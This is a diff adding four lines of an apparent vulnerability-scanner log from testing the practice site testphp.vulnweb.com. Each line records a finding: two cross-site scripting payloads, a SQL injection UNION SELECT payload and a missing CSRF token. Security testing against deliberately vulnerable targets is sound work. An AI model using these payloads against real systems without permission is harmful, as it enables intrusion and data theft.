@@ -1,0 +1,4 @@
+2025-07-28 16:57:19,412 - XSS found at http://testphp.vulnweb.com/search.php?test=query with payload: <script>alert('xss')</script>
+2025-07-28 16:57:21,406 - XSS found at http://testphp.vulnweb.com/search.php?test=query with payload: <img src=x onerror=alert('xss')>
+2025-07-28 16:57:24,701 - SQLi found at http://testphp.vulnweb.com/search.php?test=query with payload: ' UNION SELECT 1,2,3 --
+2025-07-28 16:57:25,370 - CSRF found at http://testphp.vulnweb.com/search.php?test=query: Missing token
